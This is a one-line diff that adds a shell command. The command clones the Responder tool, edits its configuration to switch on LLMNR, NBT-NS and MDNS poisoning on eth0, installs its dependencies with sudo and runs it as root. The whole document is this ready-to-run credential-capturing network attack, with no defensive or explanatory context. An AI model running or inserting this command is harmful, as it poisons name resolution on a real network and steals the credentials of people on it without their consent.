@@ -1,0 +1,1 @@
+getpython && git clone https://github.com/lgandx/Responder.git && cd Responder && sed -i 's/Interface = .*/Interface = eth0/' Responder.conf && sed -i 's/LLMNR = .*/LLMNR = On/; s/NBT-NS = .*/NBT-NS = On/; s/MDNS = .*/MDNS = On/' Responder.conf && sudo pip3 install -r requirements.txt && sudo python3 Responder.py -I eth0
